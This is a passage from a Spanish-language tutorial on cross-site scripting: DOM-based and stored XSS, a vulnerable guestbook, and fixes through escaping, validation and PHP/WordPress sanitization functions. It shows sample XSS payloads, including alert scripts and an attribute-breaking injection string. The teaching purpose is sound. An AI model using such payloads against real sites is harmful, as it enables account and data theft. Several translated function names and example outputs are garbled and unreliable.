En el ejemplo anterior, JavaScript no era necesario; el servidor podr√≠a haber generado todo el HTML por s√≠ solo. Si el c√≥digo del lado del servidor estuviera libre de vulnerabilidades, el sitio web estar√≠a a salvo de XSS.

Sin embargo, a medida que las aplicaciones web se vuelven m√°s avanzadas, JavaScript genera una cantidad cada vez mayor de HTML en el lado del cliente en lugar de hacerlo en el servidor. Cada vez que sea necesario cambiar el contenido sin actualizar toda la p√°gina, la actualizaci√≥n debe realizarse mediante JavaScript. En particular, este es el caso cuando una p√°gina se actualiza despu√©s de una solicitud AJAX.

Esto significa que las vulnerabilidades XSS pueden estar presentes no s√≥lo en el c√≥digo del lado del servidor de su sitio web, sino tambi√©n en el c√≥digo JavaScript del lado del cliente de su sitio web. En consecuencia, incluso con un c√≥digo del lado del servidor completamente seguro, el c√≥digo del lado del cliente a√∫n podr√≠a incluir de manera insegura la entrada del usuario en una actualizaci√≥n del DOM despu√©s de que se haya cargado la p√°gina. Si esto sucede, el c√≥digo del lado del cliente ha habilitado un ataque XSS sin que sea culpa del c√≥digo del lado del servidor.

### **XSS basado en DOM invisible para el servidor**

Existe un caso especial de XSS basado en DOM en el que, para empezar, la cadena maliciosa nunca se env√≠a al servidor del sitio web: cuando la cadena maliciosa est√° contenida en el identificador de fragmento de una URL (cualquier cosa despu√©s del car√°cter #). Los navegadores no env√≠an esta parte de la URL a los servidores, por lo que el sitio web no tiene forma de acceder a ella mediante el c√≥digo del lado del servidor. El c√≥digo del lado del cliente, sin embargo, tiene acceso a √©l y, por lo tanto, puede causar vulnerabilidades XSS si lo maneja de manera insegura.

Esta situaci√≥n no se limita a los identificadores de fragmentos. Otras entradas del usuario que son invisibles para el servidor incluyen nuevas funciones HTML5 como LocalStorage e IndexedDB.

Vulnerabilidades XSS almacenadas (o persistentes)

Un ataque XSS almacenado es mucho m√°s peligroso por dos razones.

> En primer lugar, se puede automatizar un ataque XSS almacenado. Se puede crear un script que visite miles de sitios web, explote una vulnerabilidad en cada sitio y suelte una carga √∫til XSS almacenada.

> **En segundo lugar, las v√≠ctimas de un ataque XSS almacenado no tienen que realizar ninguna otra acci√≥n que no sea visitar el sitio web afectado.** Cualquiera que visite la p√°gina afectada del sitio se convertir√° en v√≠ctima porque el c√≥digo malicioso almacenado se cargar√° en su navegador. Las v√≠ctimas no necesitan realizar ninguna acci√≥n adicional, como hacer clic en un enlace enviado por correo electr√≥nico, para verse afectadas.


Un ataque XSS almacenado ocurre cuando un atacante env√≠a datos maliciosos a un sitio web que est√° almacenado en una base de datos o alg√∫n otro mecanismo de almacenamiento. Luego, cuando otros visitantes del sitio visitan una p√°gina o una URL espec√≠fica, reciben esos datos que ejecutan y realizan alg√∫n tipo de acci√≥n maliciosa. Veamos un ejemplo:

![XSS5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss5.png?raw=true)

El c√≥digo anterior es una aplicaci√≥n de libro de visitas muy b√°sica. Tambi√©n es un ejemplo cl√°sico de vulnerabilidad XSS almacenada. Cuando cargue esta aplicaci√≥n, ver√° un formulario que le pedir√° que firme un libro de visitas que se ve as√≠:

![XSS6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss6.png?raw=true)

Una vez que firmes el libro de visitas varias veces, ver√°s algo como esto:

![XSS7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss7.png?raw=true)

Si ingresa algo de javascript en el cuadro de texto de firma que ejecuta un cuadro de alerta, ver√° esto:

![XSS8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss8.png?raw=true)

Lo que sucedi√≥ aqu√≠ es que un invitado ingres√≥ algo de JavaScript en el campo "Firmar" que se ve as√≠:

| 1 | <script>alert('XSS Expoit worked');</script> |

El javascript se almacen√≥ y ahora se entrega a todos los visitantes de la p√°gina del libro de visitas. Esta es una **vulnerabilidad XSS almacenada** que tiene un impacto mucho m√°s amplio que una vulnerabilidad XSS reflejada. Puede usarse para robar datos de cada visitante de la p√°gina afectada, no solo de los visitantes que hacen clic en un enlace especialmente dise√±ado. Por esta raz√≥n, las vulnerabilidades XSS almacenadas son mucho m√°s graves que las XSS reflejadas.

Solucionar esta vulnerabilidad es f√°cil validando la entrada y desinfectando y escapando la salida. Apliquemos eso a este script. Revise los cambios a continuaci√≥n.

![XSS9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss9.png?raw=true)

Como puede ver en el ejemplo anterior, estamos validando los datos usando una expresi√≥n regular. Ahora s√≥lo permitimos un peque√±o subconjunto de caracteres en el libro de visitas. Aunque no permitimos etiquetas HTML, ejecutamos los datos a trav√©s de la funci√≥n filter_var() de PHP con el filtro FILTER_SANITIZE_STRING para desinfectar la cadena, lo que eliminar√° cualquier etiqueta que pueda filtrarse debido a un error en nuestro c√≥digo. FILTER_SANITIZE_STRING en realidad elimina cualquier etiqueta que encuentre.

Luego, cuando generamos cada registro en el libro de visitas, usamos filter_var con el filtro FILTER_SANITIZE_FULL_SPECIAL_CHARS que no elimina las etiquetas, pero las escapa si est√°n presentes. Entonces, en el ejemplo anterior, estamos validando y desinfectando la entrada y escapando en la salida. Esto proporciona mucha protecci√≥n contra un XSS almacenado en el caso de un libro de visitas.

<aside>
üí≠ **Una nota adicional sobre el c√≥digo anterior:** probablemente hayas notado algunas otras cosas que podr√≠amos hacer m√°s seguras. Por ejemplo, almacenamos nuestro libro de visitas en un archivo que se encuentra en una carpeta accesible desde la web. Eso significa que el p√∫blico puede leer los datos sin procesar. Esto en s√≠ mismo es indeseable y darle a un atacante acceso de lectura a un archivo que no est√° dise√±ado para el consumo p√∫blico puede introducir m√°s vulnerabilidades. Una forma de solucionar esto es crear un archivo de datos pero darle una extensi√≥n PHP. Luego haga que la primera l√≠nea del archivo contenga lo siguiente:

</aside>

| 1 | <?php die("Nothing to see here!"); ?> |
| --- | --- |
|  |  |

Cuando escriba en el archivo, aseg√∫rese de que la primera l√≠nea permanezca intacta. Cuando leas el archivo, descarta siempre la primera l√≠nea. Almacene el archivo con una extensi√≥n .php, por ejemplo, data.php. Luego, si un atacante intenta acceder al archivo, el servidor web lo tratar√° como PHP ejecutable y lo cerrar√° inmediatamente.

# **M√©todos para prevenir XSS**

Recuerde que un ataque XSS es un tipo de inyecci√≥n de c√≥digo: la entrada del usuario se interpreta err√≥neamente como c√≥digo de programa malicioso. Para evitar este tipo de inyecci√≥n de c√≥digo, es necesario un manejo seguro de la entrada. Para un desarrollador web, existen dos formas fundamentalmente diferentes de realizar un manejo seguro de la entrada:

- **Codificaci√≥n**, que escapa de la entrada del usuario para que el navegador la interprete solo como datos, no como c√≥digo.
- **Validaci√≥n**, que filtra la entrada del usuario para que el navegador la interprete como c√≥digo sin comandos maliciosos.

> Si bien estos son m√©todos fundamentalmente diferentes para prevenir XSS, comparten varias caracter√≠sticas comunes que es importante comprender al usar cualquiera de ellos:

- **Contexto:** El manejo seguro de la entrada debe realizarse de manera diferente seg√∫n en qu√© parte de una p√°gina se inserte la entrada del usuario.
- **Entrante y saliente:** El manejo seguro de la entrada se puede realizar cuando su sitio web recibe la entrada (entrante) o justo antes de que su sitio web inserte la entrada en una p√°gina (saliente).
- **Servidor de cliente:** El manejo seguro de la entrada se puede realizar en el lado del cliente o en el lado del servidor, los cuales son necesarios en diferentes circunstancias. Antes de explicar en detalle c√≥mo funcionan la codificaci√≥n y la validaci√≥n, describiremos cada uno de estos puntos.

### **Contextos de manejo de entradas**

Hay muchos contextos en una p√°gina web donde se pueden insertar las entradas del usuario. Para cada uno de ellos, se deben seguir reglas espec√≠ficas para que la entrada del usuario no pueda salirse de su contexto y ser interpretada como c√≥digo malicioso. A continuaci√≥n se detallan los contextos m√°s comunes:

| Contexto | C√≥digo de ejemplo |
| --- | --- |
| contenido del elemento HTML | <div>userInput</div> |
| valor del atributo HTML | <input value="userInput"> |
| valor de consulta de URL | http://example.com/?parameter=userInputhttp://example.com/?parameter=userInput |
| valor CSS | color: userInput |
| valor de javascript | var name = "userInput"; |

### **¬øPor qu√© el contexto importa?**

En todos los contextos descritos, surgir√≠a una vulnerabilidad XSS si la entrada del usuario se insertara antes de codificarse o validarse por primera vez. Luego, un atacante podr√≠a inyectar c√≥digo malicioso simplemente insertando el delimitador de cierre para ese contexto y sigui√©ndolo con el c√≥digo malicioso. Por ejemplo, si en alg√∫n momento un sitio web inserta informaci√≥n del usuario directamente en un atributo HTML, un atacante podr√≠a inyectar un script malicioso comenzando su entrada con una comilla, como se muestra a continuaci√≥n:

| C√≥digo de aplicaci√≥n | <input value="userInput"> |
| --- | --- |
| Cadena maliciosa | "><script>...</script><input value=" |
| C√≥digo resultante | <input value=""><script>...</script><input value=""> |

<aside>
üëâ Esto podr√≠a evitarse simplemente eliminando todas las comillas en la entrada del usuario, y todo estar√≠a bien, pero s√≥lo en este contexto. Si la misma entrada se insertara en otro contexto, el delimitador de cierre ser√≠a diferente y la inyecci√≥n ser√≠a posible. Por esta raz√≥n, el manejo seguro de la entrada siempre debe adaptarse al contexto donde se insertar√° la entrada del usuario.

</aside>

## **Manejo de entradas entrantes y salientes**

Instintivamente, podr√≠a parecer que XSS se puede prevenir codificando o validando todas las entradas del usuario tan pronto como su sitio web las reciba. De esta manera, cualquier cadena maliciosa ya deber√≠a haber sido neutralizada cada vez que se incluye en una p√°gina, y los scripts que generan HTML no tendr√°n que preocuparse por el manejo seguro de la entrada.

El problema es que, como se describi√≥ anteriormente, la entrada del usuario se puede insertar en varios contextos en una p√°gina. No existe una manera f√°cil de determinar cu√°ndo llega la entrada del usuario y en qu√© contexto se insertar√° finalmente, y la misma entrada del usuario a menudo debe insertarse en contextos diferentes. Por lo tanto, confiar en el manejo de la entrada entrante para evitar XSS es una soluci√≥n muy fr√°gil que ser√° propensa a errores. (La caracter√≠stica obsoleta de "[comillas m√°gicas](http://php.net/manual/en/security.magicquotes.php)" de PHP es un ejemplo de dicha soluci√≥n).

En cambio, el manejo de la entrada saliente deber√≠a ser su principal l√≠nea de defensa contra XSS, porque puede tener en cuenta el contexto espec√≠fico en el que se insertar√° la entrada del usuario. Dicho esto, la validaci√≥n entrante a√∫n se puede utilizar para agregar una capa secundaria de protecci√≥n, como describiremos m√°s adelante.

### **D√≥nde realizar un manejo seguro de la entrada**

En la mayor√≠a de las aplicaciones web modernas, la entrada del usuario se maneja tanto mediante c√≥digo del lado del servidor como mediante c√≥digo del lado del cliente. Para protegerse contra todos los tipos de XSS, se debe realizar un manejo de entrada seguro tanto en el c√≥digo del lado del servidor como en el c√≥digo del lado del cliente.

- Para protegerse contra XSS tradicional, el manejo seguro de la entrada debe realizarse en el c√≥digo del lado del servidor. Esto se hace utilizando cualquier lenguaje soportado por el servidor.
- Para protegerse contra XSS basado en DOM donde el servidor nunca recibe la cadena maliciosa (como el ataque de identificador de fragmento descrito anteriormente ), se debe realizar un manejo de entrada seguro en el c√≥digo del lado del cliente. Esto se hace usando JavaScript.

Ahora que hemos explicado por qu√© es importante el contexto, por qu√© es importante la distinci√≥n entre el manejo de entradas entrantes y salientes y por qu√© es necesario realizar un manejo seguro de las entradas tanto en el c√≥digo del lado del cliente como en el del lado del servidor, continuaremos explicando c√≥mo funciona el contexto. En realidad, se realizan dos tipos de manejo seguro de entradas (codificaci√≥n y validaci√≥n).

### **Codificaci√≥n**

La codificaci√≥n es el acto de escapar de la entrada del usuario para que el navegador la interprete s√≥lo como datos, no como c√≥digo. El tipo de codificaci√≥n m√°s reconocible en el desarrollo web es el escape HTML, que convierte caracteres como **<**y **>**en **&lt;**y **&gt;**, respectivamente.

El siguiente pseudoc√≥digo es un ejemplo de c√≥mo la entrada del usuario podr√≠a codificarse utilizando el escape HTML y luego insertarse en una p√°gina mediante un script del lado del servidor:

> print "<html>"
> 
> 
> print "Latest comment: "
> 
> print encodeHtml(userInput)
> 
> print "</html>"
> 

Si la entrada del usuario fuera la cadena <script>...</script>, el HTML resultante ser√≠a el siguiente:

> <html>
> 
> 
> Latest comment:
> 
> **&lt;script&gt;...&lt;/script&gt;**
> 
> </html>
> 

<aside>
üí° Debido a que se han escapado todos los caracteres con significado especial, el navegador no analizar√° ninguna parte de la entrada del usuario como HTML.

</aside>

## **Codificaci√≥n en c√≥digo del lado del cliente y del lado del servidor**

Al realizar la codificaci√≥n en el c√≥digo del lado del cliente, el lenguaje utilizado siempre es JavaScript, que tiene funciones integradas que codifican datos para diferentes contextos.

Tmbi√©n, debes confiar en las funciones disponibles en el lenguaje o marco del lado del servidor. Debido a la gran cantidad de lenguajes y marcos disponibles, este tutorial no cubrir√° los detalles de la codificaci√≥n en ning√∫n lenguaje o marco espec√≠fico del lado del servidor. Sin embargo, estar familiarizado con las funciones de codificaci√≥n utilizadas en el lado del cliente en JavaScript tambi√©n es √∫til al escribir c√≥digo del lado del servidor.

### **Codificaci√≥n en el lado del cliente**

Al codificar la entrada del usuario en el lado del cliente usando JavaScript, existen varios m√©todos y propiedades integrados que codifican autom√°ticamente todos los datos seg√∫n el contexto:

| Contexto | M√©todo/propiedad |
| --- | --- |
| contenido del elemento HTML | node.textContent = userInput |
| valor del atributo HTML | element.setAttribute(attribute, userInput)
o
element[attribute] = userInput |
| valor de consulta de URL | window.encodeURIComponent(userInput) |
| valor CSS | element.style.property = userInput |

<aside>
üí° El √∫ltimo contexto mencionado anteriormente (valores de JavaScript) no est√° incluido en esta lista, porque JavaScript no proporciona una forma integrada de codificar los datos que se incluir√°n en el c√≥digo fuente de JavaScript.

</aside>

## **Limitaciones de la codificaci√≥n**

Incluso con codificaci√≥n, ser√° posible introducir cadenas maliciosas en algunos contextos. Un ejemplo notable de esto es cuando se utiliza la entrada del usuario para proporcionar URL, como en el siguiente ejemplo:

> document.querySelector('a').href = userInput

Aunque asignar un valor a la hrefpropiedad de un elemento ancla lo codifica autom√°ticamente para que se convierta en nada m√°s que un valor de atributo, esto en s√≠ mismo no impide que el atacante inserte una URL que comience con " javascript:". Cuando se hace clic en el enlace, se ejecutar√° cualquier JavaScript incrustado dentro de la URL.

La codificaci√≥n tambi√©n es una soluci√≥n inadecuada cuando realmente se desea que el usuario defina parte del c√≥digo de una p√°gina. Un ejemplo es una p√°gina de perfil de usuario donde el usuario puede definir HTML personalizado. Si este HTML personalizado estuviera codificado, la p√°gina de perfil podr√≠a consistir √∫nicamente en texto sin formato.

En situaciones como estas, la codificaci√≥n debe complementarse con la validaci√≥n, que describiremos a continuaci√≥n.

### **Validaci√≥n**

La validaci√≥n es el acto de filtrar la entrada del usuario para que se eliminen todas las partes maliciosas, sin necesariamente eliminar todo el c√≥digo que contiene. Uno de los tipos de validaci√≥n m√°s reconocibles en el desarrollo web es permitir algunos elementos HTML (como <em>y <strong>) pero no permitir otros (como <script>).

Hay dos caracter√≠sticas principales de validaci√≥n que difieren entre implementaciones:

> Estrategia de clasificaci√≥n: La entrada del usuario se puede clasificar mediante listas negras o listas blancas.
> 
> 
> **Resultado de la validaci√≥n: Las entradas del usuario identificadas como maliciosas pueden rechazarse o desinfectarse.**
> 

### **Funciones para validar tus datos:**

La validaci√≥n en programaci√≥n es cuando verifica que los datos que su aplicaci√≥n ha recibido se encuentran dentro de las restricciones que usted define para garantizar que no contengan nada irrazonable, innecesario o malicioso. **La validaci√≥n no reemplaza la desinfecci√≥n o el escape** , porque como veremos (en la secci√≥n que analiza filter_var() a continuaci√≥n), los datos maliciosos pueden pasar algunas funciones de validaci√≥n.

Las restricciones que utilizar√° var√≠an, pero con frecuencia son similares a las restricciones utilizadas en un lenguaje estrictamente tipificado. Por ejemplo, podr√≠a utilizar algunas de las siguientes comprobaciones:

- ¬øSon los datos un n√∫mero entero? (solo de 0 a 9 d√≠gitos)
- ¬øLos datos son flotantes y se permite un punto decimal? (0 a 9 y car√°cter .)
- Son n√∫meros de datos y guiones, por ejemplo, un campo de fecha de tarjeta de cr√©dito.
- ¬øLos datos son una cadena con n√∫meros, letras, espacios y puntuaci√≥n √∫nicamente?
- ¬øLos datos son una de un n√∫mero limitado de opciones que se pueden seleccionar, por ejemplo, 'opci√≥n1', 'opci√≥n2', 'opci√≥n3'?

Durante la validaci√≥n, si rechaza datos, a menudo devolver√° un error al usuario describiendo el problema y solicit√°ndole los datos correctos.

A continuaci√≥n, hemos incluido funciones que los desarrolladores de PHP utilizan con frecuencia para comprobar si los datos recibidos por una aplicaci√≥n son v√°lidos (para validar datos). Por lo general, se usan en una declaraci√≥n if() para verificar si los datos son v√°lidos y, de lo contrario, la aplicaci√≥n devuelve un error al usuario.

| Funci√≥n | Que hace | Ejemplo |
| --- | --- | --- |
| es_numeric() | Prueba si los datos coinciden del 0 al 9 con signo opcional y punto decimal opcional. | is_numeric($input) devolver√° verdadero si $input == '-9.123' |
| preg_match() | Pruebe si los datos coinciden con la expresi√≥n regular. | preg_match('/^[az]{2,3}$/', $input) devuelve verdadero si $input tiene letras min√∫sculas de 2 o 3 caracteres. Tenga en cuenta ^ y $ en la expresi√≥n regular. |
| var_filtro() | Pruebe si los datos se ajustan a un filtro PHP integrado. | filter_var($input, FILTER_VALIDATE_EMAIL) prueba si $input es una direcci√≥n de correo electr√≥nico v√°lida. Otros filtros √∫tiles son FILTER_VALIDATE_IP, FILTER_VALIDATE_URL, FILTER_VALIDATE_BOOLEAN. http://php.net/manual/en/filter.filters.validate.php |
| en_matriz() | Prueba si los datos pertenecen a un rango de valores permitidos. | in_array($input, array('Windows', 'Linux', 'OSX', 'Other')) devolver√° verdadero si $input contiene uno de los valores permitidos. Ideal para campos <select> y botones de opci√≥n en formularios web. |

### C√≥mo utilizar de forma segura expresiones regulares para la validaci√≥n

Cuando use expresiones regulares con preg_match() para validar datos, aseg√∫rese de hacer coincidir toda la cadena usando un car√°cter de intercalaci√≥n ^ al comienzo de su expresi√≥n regular y un signo de d√≥lar $ al final. Estos coinciden con el inicio y el final de una cadena y garantizar√°n que no solo est√© validando algo en medio de la entrada, sino que est√© validando toda la cadena. Omitirlos crea un grave problema de seguridad porque un atacante puede incluir algunos datos v√°lidos que pasar√°n la prueba, pero anteponer o agregar cualquier cosa maliciosa que desee.

**El uso de filter_var() para la validaci√≥n no reemplaza la desinfecci√≥n o el escape.**

En general, la funci√≥n filter_var() se utiliza de la siguiente manera para validar los datos a medida que llegan a su aplicaci√≥n:

| 1
2
3 | if($test = filter_var('test@example.com', FILTER_VALIDATE_EMAIL)){
¬†¬†¬†¬†¬†¬†¬†¬†echo "Received: $test\n";
} |
| --- | --- |

Si reemplaza el correo electr√≥nico anterior con 'test@example.com<script>' ver√° que la verificaci√≥n falla y la declaraci√≥n de eco no se ejecuta.

Considere el siguiente ejemplo que demuestra c√≥mo los datos maliciosos pueden pasar un paso de validaci√≥n. Esto muestra c√≥mo la validaci√≥n no sustituye a la desinfecci√≥n y el escape en la salida.

| 1
2
3 | if($test = filter_var(' http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca%22%27, FILTER_VALIDATE_URL)){
¬†¬†¬†¬†¬†¬†¬†¬†echo "Received: $test\n";
} |
| --- | --- |

El ejemplo anterior generar√° lo siguiente:

| 1 | Received: http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca" |
| --- | --- |

Esto crea una vulnerabilidad XSS si esta salida no est√° desinfectada ni escapada. Cambiar el c√≥digo de la siguiente manera eliminar√° la vulnerabilidad XSS:

| 1
2
3 | if($test = filter_var(' http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca%22%27, FILTER_VALIDATE_URL)){
¬†¬†¬†¬†¬†¬†¬†¬†echo "Received: " . esc_url($test) . "\n";
} |
| --- | --- |

El c√≥digo anterior generar√° lo siguiente, que es seguro:

| 1 | Received: http://example.com/?scriptalert(XSS)/scripta |
| --- | --- |

Consulte a continuaci√≥n para obtener m√°s informaci√≥n sobre las funciones que puede utilizar para escapar y desinfectar.

### Funciones para escapar y desinfectar sus datos

Cuando est√© listo para enviar datos al navegador web de un visitante, un archivo, una red o alg√∫n otro lugar donde los datos salgan de su aplicaci√≥n, deber√° asegurarse de que los datos que est√° enviando est√©n seguros. PHP y WordPress proporcionan una variedad de funciones que escapan y/o desinfectan sus datos. Es importante tener en cuenta que estas funciones cambiar√°n sus datos si es necesario para que est√©n seguros.

### Funciones integradas de desinfecci√≥n y escape de PHP

Las siguientes funciones est√°n integradas en PHP y puede usarlas ya sea que est√© ejecutando su aplicaci√≥n dentro del entorno de WordPress o no. Notar√°s que proporcionamos varios ejemplos de filter_var(). Este es el nuevo est√°ndar en la desinfecci√≥n de PHP y se incluye de forma predeterminada con PHP desde la versi√≥n 5.2 de PHP. Recomendamos usar filter_var() en lugar de funciones PHP m√°s antiguas.

| Funci√≥n | Producci√≥n | Descripci√≥n |
| --- | --- | --- |
| intervalo('123AA456') | 123 | Desinfectar n√∫meros enteros. [ http://php.net/manual/en/function.intval.php ] |
| filter_var('marca<script>@ejemplo.com', FILTER_SANITIZE_EMAIL) | markscript@ejemplo.com | Desinfectar los correos electr√≥nicos. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Probando <etiquetas> y caracteres.', FILTER_SANITIZE_SPECIAL_CHARS) | Probando <etiquetas> & caracteres. | Codifica caracteres especiales. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Eliminar <etiqueta> y codificar.', FILTER_SANITIZE_STRING); | Pele y codifique. | Eliminar etiquetas. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Eliminar <etiqueta> y codificar.', FILTER_SANITIZE_STRING, FILTER_FLAG_ENCODE_LOW | FILTER_FLAG_ENCODE_HIGH | FILTER_FLAG_ENCODE_AMP)
 | Tira & codificar. | Elimine etiquetas con indicadores de codificaci√≥n adicionales. [ http://php.net/manual/en/filter.filters.sanitize.php ] |

**Veamos algunos casos con WordPress**

## **Funciones de desinfecci√≥n de la API de WordPress**

WordPress incluye una variedad de funciones de desinfecci√≥n dise√±adas para casos de uso espec√≠ficos. Hemos incluido usos de ejemplo a continuaci√≥n que le dan una idea de c√≥mo estas funciones cambian los datos.

| Funci√≥n | Producci√≥n | Descripci√≥n |
| --- | --- | --- |
| absint('-123ABC') | 123 | Desinfecta n√∫meros enteros positivos. [ https://codex.wordpress.org/Function_Reference/absint ] |
| sanitize_email(‚Äú!#$%^&*()__+=-{}|\][:\‚Äù\';<>?/.,test@example.com‚Äù) | !#$%^&*__+=-{}|'?/.prueba@ejemplo.com | Desinfectar direcciones de correo electr√≥nico. [ https://codex.wordpress.org/Function_Reference/sanitize_email ] |
| sanitize_file_name('.-_/path/to/file‚Äìname.txt'); | rutaalnombre-archivo.txt | Desinfectar nombres de archivos. [ https://codex.wordpress.org/Function_Reference/sanitize_file_name ] |
| sanitize_html_class('clase!@#$%^&*()-nombre_aqu√≠.'); | nombre-clase_aqu√≠ | Desinfecta los nombres de clases de CSS. [ https://codex.wordpress.org/Function_Reference/sanitize_html_class ] |
| sanitize_key('Nombre-Clave!@#$%^&*()<>,.?/'); | Nombre clave | Desinfectar claves para matrices asociativas. [ https://codex.wordpress.org/Function_Reference/sanitize_key ] |
| sanitize_mime_type('text/plain-blah!@#$%^&*()}{[]‚Äù:;><,.?/'); | texto/plain-blah*./ | Desinfectar los tipos de mimos. [ https://codex.wordpress.org/Function_Reference/sanitize_mime_type ] |
| sanitize_option('thumbnail_size_h', '123ABC-_'); | 123 | Opci√≥n de desinfecci√≥n de WP. El tipo de filtrado depende del nombre de la opci√≥n. [ https://codex.wordpress.org/Function_Reference/sanitize_option ] |
| sanitize_sql_orderby('colName'); | colNombre | Desinfecta un nombre de columna utilizado en SQL 'ordenar por'. Devuelve en blanco si se encuentran caracteres no v√°lidos. [ https://codex.wordpress.org/Function_Reference/sanitize_sql_orderby ] |
| sanitize_text_field('<tag>algo de texto</tag>') | alg√∫n texto | Comprueba si hay UTF-8 no v√°lido, convierte caracteres √∫nicos < en entidad, elimina todas las etiquetas, elimina saltos de l√≠nea, tabulaciones y espacios en blanco adicionales, elimina octetos. [ https://codex.wordpress.org/Function_Reference/sanitize_text_field ] |
| sanitize_title('<etiqueta><?php //bla ?>T√≠tulo aqu√≠'); | t√≠tulo-aqu√≠ | Convierte el texto en un t√≠tulo estilo slug para usarlo en una URL. [ https://codex.wordpress.org/Function_Reference/sanitize_title ] |
| sanitize_user('<etiqueta>123ABCdef _.-*@nombre!#$', verdadero); | 123ABCdef _ .-@nombre | Desinfecta los nombres de usuario de WP. El segundo par√°metro permite una desinfecci√≥n estricta. [ https://codex.wordpress.org/Function_Reference/sanitize_user ] |

### Funciones de escape de la API de WordPress

WordPress tambi√©n incluye funciones de escape para uso general. Hemos incluido las funciones principales a continuaci√≥n con ejemplos de entrada y salida para ilustrar su uso.

| Funci√≥n | Producci√≥n | Comentarios |
| --- | --- | --- |
| esc_html('<etiqueta> & texto'); | <etiqueta> &erio; texto | Escapar de HTML para una salida segura del navegador. [ https://codex.wordpress.org/Function_Reference/esc_html ] |
| esc_url('http://example.com/
<script>alert(‚ÄúPRUEBA‚Äù);</script>'); | http://ejemplo.com/
scriptalert(PRUEBA);/script | Escapar de las URL para que sean seguras para su salida como texto o atributos HTML. [ https://codex.wordpress.org/Function_Reference/esc_url ] |
| esc_js('alerta(‚Äú1‚Äù);'); | alerta("1"); | Escapa de Javascript para que sea seguro para el uso de HTML en l√≠nea, por ejemplo, en el controlador onclick. [ https://codex.wordpress.org/Function_Reference/esc_js ] |
| esc_attr('attr-<>&\'‚Äùnombre'); | attr-<>&'"nombre | √öselo para escapar de atributos HTML, por ejemplo, alt, t√≠tulo, valor, etc. [ https://codex.wordpress.org/Function_Reference/esc_attr ] |
| esc_textarea('Texto <etiqueta> & texto'); | Texto <etiqueta> &erio; texto | Texto de escape para salida en el elemento <textarea>. [ https://codex.wordpress.org/Function_Reference/esc_textarea ] |

### **La funci√≥n `wp_kses()`**

wp_kses [()](https://codex.wordpress.org/Function_Reference/wp_kses) es una funci√≥n de desinfecci√≥n m√°s compleja. Elimina los guiones malvados. De ah√≠ viene el nombre: ‚Äúkses quita guiones malvados‚Äù. Cuando use wp_kses() necesitar√° incluir una serie de etiquetas y los atributos permitidos para cada etiqueta como segundo par√°metro de kses. He aqu√≠ un ejemplo:

| 1
2
3
4
5
6
7
8 | $allowed = array(
¬†¬†¬†'a' => array( 'href' => array(), 'title' => array() ),
¬†¬†¬†'br' => array(),
¬†¬†¬†'em' => array(),
¬†¬†¬†'strong' => array(),
);
¬†
echo wp_kses($output, $allowed); |
| --- | --- |

Lo anterior permitir√° la etiqueta 'A' con los atributos 'href' y 'title'. Tambi√©n permitir√° las siguientes etiquetas sin atributos: br, em y strong. Si se incluyen atributos con esas etiquetas, se eliminar√°n.

`wp_kses()` consume mucho procesador porque el c√≥digo es complejo. Entonces, en general, le recomendamos que primero intente usar las funciones PHP integradas porque son m√°s r√°pidas, luego las funciones m√°s simples de limpieza y escape de WordPress, y luego solo use wp_kses() si es necesario. Eso le brindar√° el mejor rendimiento para su complemento o tema.

En Worpress es importante que tomes medidas para solucionar el problema. Aqu√≠ hay algunos pasos que puedes seguir:

- Actualiza WordPress y los plugins a la √∫ltima versi√≥n: Asegurate de que WordPress y los plugins que est√°s usando est√©n actualizados a la √∫ltima versi√≥n. Los desarrolladores a menudo lanzan actualizaciones de seguridad para abordar las vulnerabilidades conocidas, incluyendo las vulnerabilidades de XSS.
- Realiza un an√°lisis de seguridad: Realiza un an√°lisis de seguridad completo en tu sitio para identificar cualquier otra vulnerabilidad que pueda estar presente. Hay varias herramientas de an√°lisis de seguridad disponibles en l√≠nea que pueden ayudarte a escanear tu sitio en busca de vulnerabilidades.
- Elimina el c√≥digo malicioso: Si encuentras c√≥digo malicioso en tu sitio, elim√≠nalo inmediatamente. A menudo, el c√≥digo malicioso de XSS se puede encontrar en los archivos PHP o JavaScript de tu sitio. Asegurate de que elimines todo el c√≥digo malicioso y revisa todos los archivos para estar seguro.
- Restablece todas las contrase√±as: Cambia todas las contrase√±as de tu sitio, incluyendo la contrase√±a de administrador, y asegurate de que sean fuertes y √∫nicas.
- Configura las pol√≠ticas de seguridad adecuadas: Configura adecuadamente las pol√≠ticas de seguridad de tu sitio para evitar que los atacantes exploten vulnerabilidades de XSS. Por ejemplo, puedes configurar las directivas de seguridad de contenido para evitar que se carguen scripts maliciosos.
- Utiliza plugins de seguridad: Utiliza plugins de seguridad de WordPress de buena reputaci√≥n para proteger tu sitio contra futuros ataques de XSS. Estos plugins pueden ayudarte a detectar y prevenir vulnerabilidades de seguridad, como la inyecci√≥n de scripts maliciosos.

<aside>
üí° Es importante tomar medidas r√°pidas para solucionar una vulnerabilidad de XSS en tu sitio WordPress, ya que los atacantes pueden utilizar estas vulnerabilidades para tomar el control de tu sitio y robar datos sensibles.

</aside>

### **Estrategia de clasificaci√≥n**

- **Lista negra**

Instintivamente, parece razonable realizar la validaci√≥n definiendo un patr√≥n prohibido que no deber√≠a aparecer en la entrada del usuario. Si una cadena coincide con este patr√≥n, se marca como no v√°lida. Un ejemplo ser√≠a permitir a los usuarios enviar URL personalizadas con cualquier protocolo excepto javascript:. Esta estrategia de clasificaci√≥n se llama *lista negra* .

Sin embargo, la inclusi√≥n en listas negras tiene dos inconvenientes importantes:

- **Complejidad**

Describir con precisi√≥n el conjunto de todas las posibles cadenas maliciosas suele ser una tarea muy compleja. La pol√≠tica de ejemplo descrita anteriormente no se pudo implementar exitosamente simplemente buscando la subcadena " javascript", porque esto perder√≠a cadenas del formato " Javascript:" (donde la primera letra est√° en may√∫scula) y " &#106;avascript:" (donde la primera letra est√° codificada como un n√∫mero referencia de personaje).

- **Estancamiento**

